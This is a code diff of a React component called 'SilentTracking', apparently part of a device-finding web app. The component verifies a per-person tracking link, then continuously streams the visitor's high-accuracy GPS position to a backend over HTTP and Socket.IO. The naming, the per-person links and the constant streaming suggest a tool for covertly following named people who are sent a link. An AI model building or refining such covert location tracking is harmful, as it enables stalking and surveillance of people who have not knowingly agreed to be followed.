@@ -1,96 +1,119 @@
-import React, { useEffect, useRef, useState } from "react";
+// src/components/SilentTracking.jsx
+import React, { useEffect, useState } from "react";
 import { useParams } from "react-router-dom";
-
-const API = "https://find-device-server.onrender.com";
+import io from "socket.io-client";
+import axios from "axios";
 
 const SilentTracking = () => {
-  const { shortCode } = useParams();
-  const locationSentRef = useRef(false);
-  const [status, setStatus] = useState("Getting link info...");
+  const { linkId } = useParams();
+  const [personName, setPersonName] = useState("");
+  const [status, setStatus] = useState("Verifying link...");
+  const [socket, setSocket] = useState(null);
 
   useEffect(() => {
-    const startTracking = async () => {
+    // 1️⃣ Verify the tracking link with backend
+    const verifyLink = async () => {
       try {
-        // Step 1: Resolve shortCode → linkId
-        const res = await fetch(`${API}/api/short/${shortCode}`);
-        if (!res.ok) {
-          setStatus("Link expired or invalid");
-          return;
-        }
-        const { trackingUrl } = await res.json();
-        setStatus("Requesting location...");
-
-        // Step 2: Parse linkId from trackingUrl
-        const linkId = trackingUrl.split("/track/")[1];
-        if (!linkId) {
-          setStatus("Invalid tracking link");
-          return;
-        }
-
-        // Step 3: Request geolocation after small delay
-        await new Promise((r) => setTimeout(r, 300)); // ensures component mounted
-
-        if (!navigator.geolocation) {
-          setStatus("Geolocation not supported");
-          return;
-        }
-
-        navigator.geolocation.getCurrentPosition(
-          async (pos) => {
-            if (locationSentRef.current) return;
-            locationSentRef.current = true;
-
-            const location = {
-              lat: pos.coords.latitude,
-              lng: pos.coords.longitude,
-              accuracy: pos.coords.accuracy,
-            };
-
-            // Step 4: Send to backend
-            const trackRes = await fetch(
-              `${API}/api/track-location/${linkId}`,
-              {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ location }),
-              },
-            );
-            const result = await trackRes.json();
-
-            if (result.success) setStatus("Location sent successfully!");
-            else setStatus("Failed to save location");
-          },
-          (err) => {
-            if (err.code === err.PERMISSION_DENIED)
-              setStatus("Permission denied");
-            else setStatus("Unable to get location");
-          },
-          { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 },
+        const res = await axios.get(
+          `${process.env.VITE_API_URL}/api/track/${linkId}`,
         );
+        if (res.data.valid) {
+          setPersonName(res.data.personName);
+          setStatus("Tracking started...");
+        } else {
+          setStatus("Invalid or expired link");
+        }
       } catch (err) {
         console.error(err);
-        setStatus("Error tracking location");
+        setStatus("Error verifying link");
       }
     };
 
-    startTracking();
-  }, [shortCode]);
+    verifyLink();
+  }, [linkId]);
+
+  useEffect(() => {
+    if (!personName) return;
+
+    // 2️⃣ Connect Socket.IO for real-time updates (optional)
+    const newSocket = io(process.env.VITE_API_URL, {
+      query: { linkId },
+    });
+
+    newSocket.on("connect", () => {
+      console.log("Connected to Socket.IO server:", newSocket.id);
+    });
+
+    newSocket.on("error", (err) => {
+      console.error("Socket error:", err);
+    });
+
+    setSocket(newSocket);
+
+    return () => {
+      newSocket.disconnect();
+    };
+  }, [personName, linkId]);
+
+  useEffect(() => {
+    if (!personName) return;
+
+    // 3️⃣ Capture geolocation continuously
+    const sendLocation = (position) => {
+      const { latitude, longitude, accuracy } = position.coords;
+      const locationData = { lat: latitude, lng: longitude, accuracy };
+
+      // Send via API
+      axios
+        .post(`${process.env.VITE_API_URL}/api/track-location/${linkId}`, {
+          location: locationData,
+        })
+        .then((res) => {
+          if (res.data.success) {
+            console.log("Location sent:", locationData);
+          }
+        })
+        .catch((err) => console.error("Error sending location:", err));
+
+      // Optional: Send via Socket.IO for real-time updates
+      if (socket) {
+        socket.emit("share-location", { location: locationData }, (res) => {
+          if (res.success) console.log("Socket location sent");
+        });
+      }
+    };
+
+    const handleError = (err) => {
+      console.error("Geolocation error:", err.message);
+      setStatus(`Error: ${err.message}`);
+    };
+
+    // Start watching position
+    if (navigator.geolocation) {
+      const watcher = navigator.geolocation.watchPosition(
+        sendLocation,
+        handleError,
+        {
+          enableHighAccuracy: true,
+          maximumAge: 5000,
+          timeout: 10000,
+        },
+      );
+
+      return () => {
+        navigator.geolocation.clearWatch(watcher);
+      };
+    } else {
+      setStatus("Geolocation not supported on this device");
+    }
+  }, [personName, socket, linkId]);
 
   return (
-    <div
-      style={{
-        display: "flex",
-        alignItems: "center",
-        justifyContent: "center",
-        height: "100vh",
-        flexDirection: "column",
-        background: "#111",
-        color: "#fff",
-        fontFamily: "system-ui",
-        textAlign: "center",
-      }}
-    >
-      <div>{status}</div>
+    <div style={{ padding: "2rem", textAlign: "center" }}>
+      <h1>Silent Tracking</h1>
+      <p>Person: {personName || "—"}</p>
+      <p>Status: {status}</p>
+      <p>This page will silently send your location to the server.</p>
     </div>
   );
 };
